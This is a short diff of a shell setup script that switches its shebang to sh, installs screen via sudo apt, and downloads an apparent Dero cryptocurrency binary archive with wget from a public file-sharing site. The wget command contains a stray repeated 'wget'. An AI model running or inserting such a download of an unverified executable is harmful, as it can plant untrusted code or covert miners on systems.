@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 sudo apt update
 sudo apt install screen -y
 wget wget https://www.dosyaupload.com/4OEHd/dero_linux_amd64.tar.gz
